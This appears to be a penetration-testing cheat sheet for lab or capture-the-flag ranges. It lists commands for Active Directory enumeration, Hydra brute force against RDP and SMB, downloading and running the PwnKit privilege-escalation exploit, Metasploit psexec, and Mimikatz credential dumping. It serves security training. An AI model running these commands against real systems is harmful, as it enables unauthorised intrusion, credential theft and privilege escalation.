# ****1. Active Directory Range****
Goal: Assess the security posture of Active Directory environments.

## **Tools and Commands**
**1.1 Nmap for Initial Enumeration**
Identify active ports and services to locate the Domain Controller.
- nmap -sS -p- -T4 -A -v 192.168.1.0 
- nmap -p445 --script smb-enum-shares,smb-enum-users 192.168.1.0 

**1.2 NBTSTAT for NetBIOS Enumeration**
- Confirm the NetBIOS name and domain.
- nbtstat -A 172.25.170.30

**1.3 Hydra for Brute Force**
Attempt brute force on RDP or SMB services to gain credentials.
- hydra -l <username> -P <password_file> rdp://192.168.1.0
- hydra -l <username> -P <password_file> smb://192.168.1.0

**Key Tip: Use CrackMapExec to enumerate SMB shares and check password policies.**
- crackmapexec smb 192.168.1.0 -u <username> -p <password>

# ****2. Binary Exploitation Range****
Goal: Identify and exploit vulnerabilities in binaries for privilege escalation or arbitrary code execution.

## **Tools and Commands**
**2.1 GDB for Binary Analysis**
Debug the binary and find memory vulnerabilities.
- gdb ./binary  
- break main  
- run  
- info registers  

**2.2 PwnKit for Privilege Escalation**
- Leverage a known exploit to escalate privileges.
- wget https://github.com/ly4k/PwnKit/raw/main/pwnkit.c  
- gcc pwnkit.c -o pwnkit  
- ./pwnkit  

**2.3 BinWalk for Firmware Analysis**
- Extract and analyze embedded files from firmware images.
- binwalk -e FileOne.bin  
- cd _FileOne.bin.extracted  

#**3. CTF Range**
Goal: Compromise target machines and retrieve sensitive information.

## **Tools and Commands**
**3.1 Nmap and Dirb for Web Enumeration**
- Enumerate HTTP services and find hidden directories.
- nmap -sS -p80,443 -A 192.168.1.0 
- dirb http://192.168.1.0 

**3.2 WPScan for WordPress Vulnerabilities**
Scan for vulnerable plugins and themes.
- wpscan --url http://192.168.1.0  --enumerate p  

**3.3 Metasploit for Exploitation**
Exploit SMB services using the PSExec module.
- use exploit/windows/smb/psexec  
- set RHOSTS 192.168.1.0 
- set SMBUser <username>  
- set SMBPass <password>  
- exploit  

# **4. IoT Range**
Goal: Analyze IoT firmware for sensitive data or configuration flaws.

**Tools and Commands**
**4.1 Firmware Extraction with BinWalk**
Identify and extract compressed files.
- binwalk -e IOT.bin  

**4.2 File Analysis**
Search for sensitive configuration files.
- grep -i "password" romfile.cfg  
- cat romfile.cfg | grep admin  

# **5. Post-Exploitation and Privilege Escalation Range**
Goal: Maintain access and escalate privileges on compromised systems.

## **Tools and Commands**
**5.1 CrackMapExec for Lateral Movement**
Enumerate and authenticate across the network.
- crackmapexec smb 192.168.1.0 -u <username> -p <password> --shares  

**5.2 Mimikatz for Credential Dumping**
Retrieve plaintext passwords and hashes.
- mimikatz.exe  
- privilege::debug  
- sekurlsa::logonpasswords  

**5.3 Privilege Escalation on Linux**
Enumerate sudo permissions and escalate.
- sudo -l  
- sudo su
